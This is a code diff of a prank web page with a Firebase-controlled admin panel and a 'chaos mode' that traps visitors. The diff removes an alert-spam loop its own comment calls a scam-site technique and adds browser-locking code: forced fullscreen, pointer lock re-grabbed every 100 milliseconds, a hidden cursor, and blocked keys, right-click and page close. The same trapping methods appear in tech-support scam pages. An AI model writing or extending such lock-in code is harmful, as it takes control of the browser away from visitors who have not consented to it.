@@ -11,6 +11,7 @@ body {
   background:black;
   color:#0f0;
   overflow:hidden;
+  cursor:none;
 }
 canvas#matrix {
   position:fixed;
@@ -64,8 +65,8 @@ h1#banner {
 #admin-panel h3 { margin-top:0; color:#f00; }
 #admin-panel input, #admin-panel button { margin:2px; padding:5px; font-family: monospace; }
 #admin-panel button { background:#f00; color:#fff; border:none; cursor:pointer; }
-#wtfBtn { background:#ff0; color:#000; font-weight:bold; font-size:16px; padding:10px; margin-top:10px; width:100%; }
-#rickrollBtn { background:#ff1493; color:#fff; font-weight:bold; font-size:16px; padding:10px; margin-top:5px; width:100%; }
+#wtfBtn { background:#ff0; color:#000; font-weight:bold; font-size:16px; padding:10px; margin-top:10px; width:100%; cursor:pointer; }
+#rickrollBtn { background:#ff1493; color:#fff; font-weight:bold; font-size:16px; padding:10px; margin-top:5px; width:100%; cursor:pointer; }
 #admin-login { margin-top:10px; padding:10px; background:rgba(0,255,0,0.1); border-radius:5px; }
 #admin-login input { margin:2px; padding:5px; background:#000; color:#0f0; border:1px solid #0f0; font-family: monospace; }
 #adminLoginBtn { padding:5px 10px; background:#0f0; color:#000; border:none; cursor:pointer; font-family: monospace; font-weight:bold; margin-left:5px; }
@@ -87,7 +88,6 @@ html.shake {
   90% { transform: translate(-15px, -15px) rotate(-3deg); }
 }
 
-/* FAKE FULLSCREEN OVERLAY - covers everything */
 #fakeFullscreen {
   position:fixed;
   top:0;
@@ -99,6 +99,7 @@ html.shake {
   z-index:999999;
   justify-content:center;
   align-items:center;
+  cursor:none;
 }
 #fakeFullscreen.active {
   display:flex;
@@ -153,7 +154,6 @@ html.shake {
 
 <canvas id="matrix"></canvas>
 
-<!-- FAKE FULLSCREEN CONTAINER -->
 <div id="fakeFullscreen">
   <div id="nukeOverlay">
     <img id="nukeGif" src="https://media.giphy.com/media/HhTXt43pk1I1W/giphy.gif" alt="NUKE">
@@ -236,7 +236,7 @@ firebase.initializeApp(firebaseConfig);
   let admins={...DEFAULT_ADMINS};
   let bannedUsers={};
   let chaosModeLocked = false;
-  let spamInterval = null;
+  let pointerLockInterval = null;
 
   let deviceId=localStorage.getItem('hh_device_id');
   if(!deviceId){
@@ -251,31 +251,60 @@ firebase.initializeApp(firebaseConfig);
   const wtfModeRef=db.ref('wtfMode');
   const rickrollModeRef=db.ref('rickrollMode');
 
-  // SCAM SITE TECHNIQUE: Spam alerts/confirms to prevent escape
-  function startAlertSpam() {
-    let count = 0;
-    spamInterval = setInterval(() => {
-      if (!chaosModeLocked) {
-        clearInterval(spamInterval);
-        return;
-      }
-      count++;
-      if (count % 2 === 0) {
-        alert('⚠️ CHAOS MODE ACTIVE ⚠️');
-      } else {
-        confirm('Cannot exit chaos mode!');
-      }
-    }, 2000); // Alert every 2 seconds
-  }
-
-  function stopAlertSpam() {
-    if (spamInterval) {
-      clearInterval(spamInterval);
-      spamInterval = null;
+  function lockPointer() {
+    const elem = fakeFullscreen;
+    if (elem.requestPointerLock) {
+      elem.requestPointerLock();
+    } else if (elem.mozRequestPointerLock) {
+      elem.mozRequestPointerLock();
+    } else if (elem.webkitRequestPointerLock) {
+      elem.webkitRequestPointerLock();
     }
   }
 
-  // Prevent page close/navigation during chaos
+  function unlockPointer() {
+    if (document.exitPointerLock) {
+      document.exitPointerLock();
+    } else if (document.mozExitPointerLock) {
+      document.mozExitPointerLock();
+    } else if (document.webkitExitPointerLock) {
+      document.webkitExitPointerLock();
+    }
+  }
+
+  function maintainPointerLock() {
+    pointerLockInterval = setInterval(() => {
+      if (chaosModeLocked && !document.pointerLockElement && !document.mozPointerLockElement && !document.webkitPointerLockElement) {
+        lockPointer();
+      }
+    }, 100);
+  }
+
+  function enterFullscreen() {
+    const elem = document.documentElement;
+    if (elem.requestFullscreen) {
+      elem.requestFullscreen().catch(err => {});
+    } else if (elem.webkitRequestFullscreen) {
+      elem.webkitRequestFullscreen();
+    } else if (elem.msRequestFullscreen) {
+      elem.msRequestFullscreen();
+    } else if (elem.mozRequestFullScreen) {
+      elem.mozRequestFullScreen();
+    }
+  }
+
+  function exitFullscreen() {
+    if (document.exitFullscreen) {
+      document.exitFullscreen().catch(err => {});
+    } else if (document.webkitExitFullscreen) {
+      document.webkitExitFullscreen();
+    } else if (document.msExitFullscreen) {
+      document.msExitFullscreen();
+    } else if (document.mozCancelFullScreen) {
+      document.mozCancelFullScreen();
+    }
+  }
+
   function preventClose(e) {
     if (chaosModeLocked) {
       e.preventDefault();
@@ -284,7 +313,6 @@ firebase.initializeApp(firebaseConfig);
     }
   }
 
-  // Block ALL escape attempts
   function blockEscape(e) {
     if (chaosModeLocked) {
       e.preventDefault();
@@ -298,33 +326,46 @@ firebase.initializeApp(firebaseConfig);
     chaosModeLocked = true;
     fakeFullscreen.classList.add('active');
     
-    // Add beforeunload to catch tab close
+    enterFullscreen();
+    
+    setTimeout(() => {
+      lockPointer();
+      maintainPointerLock();
+    }, 100);
+    
     window.addEventListener('beforeunload', preventClose);
     
-    // Start alert spam
-    startAlertSpam();
-    
-    // Block all keyboard shortcuts
     document.addEventListener('keydown', blockEscape, true);
     document.addEventListener('keyup', blockEscape, true);
     document.addEventListener('keypress', blockEscape, true);
+    document.addEventListener('contextmenu', blockEscape, true);
   }
 
   function stopChaosTrap() {
     chaosModeLocked = false;
     fakeFullscreen.classList.remove('active');
     
-    // Remove beforeunload
+    exitFullscreen();
+    unlockPointer();
+    
+    if (pointerLockInterval) {
+      clearInterval(pointerLockInterval);
+      pointerLockInterval = null;
+    }
+    
     window.removeEventListener('beforeunload', preventClose);
     
-    // Stop alert spam
-    stopAlertSpam();
-    
-    // Remove keyboard blocks
     document.removeEventListener('keydown', blockEscape, true);
     document.removeEventListener('keyup', blockEscape, true);
     document.removeEventListener('keypress', blockEscape, true);
+    document.removeEventListener('contextmenu', blockEscape, true);
   }
+
+  fakeFullscreen.addEventListener('click', () => {
+    if (chaosModeLocked) {
+      lockPointer();
+    }
+  });
 
   function escapeHtml(str){ 
     return String(str).replace(/[&<>"']/g,s=>({
